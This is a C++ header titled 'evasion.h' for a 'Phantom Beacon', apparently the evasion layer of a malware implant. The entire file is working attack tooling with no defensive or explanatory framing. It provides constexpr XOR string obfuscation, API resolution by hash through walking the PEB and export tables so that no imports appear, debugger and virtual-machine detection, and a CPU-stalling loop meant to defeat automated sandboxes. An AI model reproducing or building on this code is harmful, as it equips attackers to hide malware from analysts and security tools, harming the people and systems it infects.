#pragma once
// ============================================================================
//  evasion.h — Phantom Beacon Evasion Layer
//  ─────────────────────────────────────────
//  1. Compile-time string obfuscation (constexpr XOR)
//  2. Dynamic API resolution via PEB walk (no static IAT entries)
// ============================================================================

#ifdef _WIN32
    #ifndef WIN32_LEAN_AND_MEAN
    #define WIN32_LEAN_AND_MEAN
    #endif
    #include <windows.h>
    #include <winternl.h>
#endif
#include <cstdint>
#include <cstring>

// ────────────────────────────────────────────────────────────────────────────
//  1. COMPILE-TIME STRING OBFUSCATION
//     Every string literal wrapped in XOR_STR("...") is XOR-encrypted at
//     compile time and decrypted on the stack at runtime, then wiped.
// ────────────────────────────────────────────────────────────────────────────

namespace obf {

constexpr uint8_t XOR_KEY = 0x5A;   // Single-byte key (simple but effective)

template <size_t N>
struct ObfString {
    char data[N]{};
    static constexpr size_t length = N;

    // Encrypt at compile time
    constexpr ObfString(const char (&str)[N]) {
        for (size_t i = 0; i < N; ++i)
            data[i] = str[i] ^ XOR_KEY;
    }

    // Decrypt at runtime into a caller-provided buffer
    void decrypt(char* out) const {
        for (size_t i = 0; i < N; ++i)
            out[i] = data[i] ^ XOR_KEY;
    }
};

// Helper: stack-allocated decrypted string with automatic zeroing
template <size_t N>
struct DecryptedString {
    char buf[N]{};

    DecryptedString(const ObfString<N>& enc) {
        enc.decrypt(buf);
    }
    ~DecryptedString() {
#ifdef _WIN32
        SecureZeroMemory(buf, N);
#else
        volatile char* p = buf;
        for (size_t i = 0; i < N; ++i) p[i] = 0;
#endif
    }
    operator const char*() const { return buf; }
    const char* c_str() const { return buf; }
};

template <size_t N>
struct ObfWString {
    wchar_t data[N]{};
    static constexpr size_t length = N;

    constexpr ObfWString(const wchar_t (&str)[N]) {
        for (size_t i = 0; i < N; ++i)
            data[i] = str[i] ^ static_cast<wchar_t>(XOR_KEY);
    }

    void decrypt(wchar_t* out) const {
        for (size_t i = 0; i < N; ++i)
            out[i] = data[i] ^ static_cast<wchar_t>(XOR_KEY);
    }
};

template <size_t N>
struct DecryptedWString {
    wchar_t buf[N]{};
    DecryptedWString(const ObfWString<N>& enc) {
        enc.decrypt(buf);
    }
    ~DecryptedWString() {
#ifdef _WIN32
        SecureZeroMemory(buf, N * sizeof(wchar_t));
#else
        volatile wchar_t* p = buf;
        for (size_t i = 0; i < N; ++i) p[i] = 0;
#endif
    }
    operator const wchar_t*() const { return buf; }
    const wchar_t* c_str() const { return buf; }
};

}  // namespace obf

// Usage: XOR_STR("kernel32.dll")  →  creates an obfuscated constexpr string
//        XOR_DEC(var)             →  decrypts it on the stack
#define XOR_STR(s) ([]() { constexpr ::obf::ObfString enc(s); return enc; }())
#define XOR_DEC(enc) ::obf::DecryptedString<decltype(enc)::length>(enc)

#define XOR_WSTR(s) ([]() { constexpr ::obf::ObfWString enc(s); return enc; }())
#define XOR_WDEC(enc) ::obf::DecryptedWString<decltype(enc)::length>(enc)


#ifdef _WIN32
// ────────────────────────────────────────────────────────────────────────────
//  2. DYNAMIC API RESOLUTION VIA PEB
//     Walk the PEB → InMemoryOrderModuleList to find a loaded DLL by hash,
//     then walk its export table to find a function by hash.
//     No strings appear in the binary for DLL/function names.
// ────────────────────────────────────────────────────────────────────────────

namespace peb {

// djb2 hash — deterministic, fast, low collision for short API names
constexpr uint32_t hash_djb2(const char* str) {
    uint32_t h = 5381;
    while (*str)
        h = ((h << 5) + h) + static_cast<uint8_t>(*str++);
    return h;
}

// Wide-char version for module names (PEB stores UNICODE_STRING)
constexpr uint32_t hash_djb2_w(const wchar_t* str) {
    uint32_t h = 5381;
    while (*str) {
        // Convert to lowercase inline
        wchar_t c = *str++;
        if (c >= L'A' && c <= L'Z') c += 32;
        h = ((h << 5) + h) + static_cast<uint8_t>(c);
    }
    return h;
}

// Pre-computed hashes (so the plaintext names never appear in the binary)
// Compute with: hash_djb2_w(L"kernel32.dll")  etc.
constexpr uint32_t HASH_KERNEL32     = 0x6DDB9555;  // kernel32.dll
constexpr uint32_t HASH_NTDLL        = 0x1EDAB0ED;  // ntdll.dll
constexpr uint32_t HASH_WINHTTP      = 0xC2B0F5A6;  // winhttp.dll

// Walk the PEB to find a module base address by name hash
inline HMODULE GetModuleByHash(uint32_t targetHash) {
#if defined(_M_X64) || defined(__x86_64__)
    auto peb = reinterpret_cast<PPEB>(__readgsqword(0x60));
#else
    auto peb = reinterpret_cast<PPEB>(__readfsdword(0x30));
#endif
    auto ldr = peb->Ldr;
    auto head = &ldr->InMemoryOrderModuleList;

    for (auto entry = head->Flink; entry != head; entry = entry->Flink) {
        auto mod = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (!mod->FullDllName.Buffer) continue;

        // Hash the base name (e.g., "kernel32.dll")
        // FullDllName includes the path; BaseDllName is just the filename
        // BaseDllName is at offset 0x58 on x64 from the LDR_DATA_TABLE_ENTRY
        // But we can extract it from FullDllName by finding the last backslash
        const wchar_t* fullName = mod->FullDllName.Buffer;
        const wchar_t* baseName = fullName;
        for (const wchar_t* p = fullName; *p; ++p) {
            if (*p == L'\\' || *p == L'/') baseName = p + 1;
        }

        if (hash_djb2_w(baseName) == targetHash)
            return reinterpret_cast<HMODULE>(mod->DllBase);
    }
    return nullptr;
}

// Walk the export table of a module to find a function by name hash
inline FARPROC GetProcByHash(HMODULE hModule, uint32_t funcHash) {
    if (!hModule) return nullptr;

    auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(hModule);
    auto ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(
        reinterpret_cast<uint8_t*>(hModule) + dosHeader->e_lfanew);

    auto& exportDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDir.Size == 0) return nullptr;

    auto exports = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(
        reinterpret_cast<uint8_t*>(hModule) + exportDir.VirtualAddress);

    auto names     = reinterpret_cast<uint32_t*>(reinterpret_cast<uint8_t*>(hModule) + exports->AddressOfNames);
    auto ordinals  = reinterpret_cast<uint16_t*>(reinterpret_cast<uint8_t*>(hModule) + exports->AddressOfNameOrdinals);
    auto functions = reinterpret_cast<uint32_t*>(reinterpret_cast<uint8_t*>(hModule) + exports->AddressOfFunctions);

    for (DWORD i = 0; i < exports->NumberOfNames; ++i) {
        auto name = reinterpret_cast<const char*>(reinterpret_cast<uint8_t*>(hModule) + names[i]);
        if (hash_djb2(name) == funcHash) {
            return reinterpret_cast<FARPROC>(
                reinterpret_cast<uint8_t*>(hModule) + functions[ordinals[i]]);
        }
    }
    return nullptr;
}

// Convenience: resolve by module hash + function hash in one call
inline FARPROC Resolve(uint32_t moduleHash, uint32_t funcHash) {
    HMODULE hMod = GetModuleByHash(moduleHash);
    if (!hMod) return nullptr;
    return GetProcByHash(hMod, funcHash);
}

}  // namespace peb

// ────────────────────────────────────────────────────────────────────────────
//  Pre-computed function hashes (djb2)
//  Usage: auto pLoadLibraryA = (decltype(&LoadLibraryA)) peb::Resolve(peb::HASH_KERNEL32, FN_LOADLIBRARYA);
// ────────────────────────────────────────────────────────────────────────────
constexpr uint32_t FN_LOADLIBRARYA    = 0x5FBFF0FB;  // LoadLibraryA
constexpr uint32_t FN_GETPROCADDRESS  = 0xCF31BB1F;  // GetProcAddress
constexpr uint32_t FN_VIRTUALALLOC    = 0x382C0F97;  // VirtualAlloc
constexpr uint32_t FN_VIRTUALFREE     = 0x668FCF2E;  // VirtualFree
constexpr uint32_t FN_SLEEP           = 0x0E076F64;  // Sleep
constexpr uint32_t FN_GETLASTERROR    = 0x5DE40B6C;  // GetLastError
#endif

// ────────────────────────────────────────────────────────────────────────────
//  3. ANTI-ANALYSIS & SANDBOX EVASION
// ────────────────────────────────────────────────────────────────────────────

namespace anti {

#ifdef _WIN32
inline bool is_debugger_present() {
#if defined(_M_X64) || defined(__x86_64__)
    auto peb = reinterpret_cast<PPEB>(__readgsqword(0x60));
#else
    auto peb = reinterpret_cast<PPEB>(__readfsdword(0x30));
#endif
    return peb->BeingDebugged != 0;
}

inline bool is_vm() {
    SYSTEM_INFO sysinfo;
    GetSystemInfo(&sysinfo);
    // Typical sandboxes/VMs used for analysis often have only 1 CPU core
    if (sysinfo.dwNumberOfProcessors < 2) return true;
    
    MEMORYSTATUSEX status;
    status.dwLength = sizeof(status);
    if (GlobalMemoryStatusEx(&status)) {
        // Typical sandboxes often have less than 2GB of RAM
        if (status.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return true;
    }
    return false;
}
#else
inline bool is_debugger_present() { return false; }
inline bool is_vm() { return false; }
#endif

// Stalling technique to frustrate automated sandboxes
// Performs heavy calculations to delay execution without relying solely on Sleep()
inline void stalling_delay(int intensity) {
    volatile uint64_t count = 0;
    for (int i = 0; i < intensity; ++i) {
        for (uint64_t j = 0; j < 10000000; ++j) {
            count += (j ^ i) * (i + 1);
        }
    }
}

}  // namespace anti
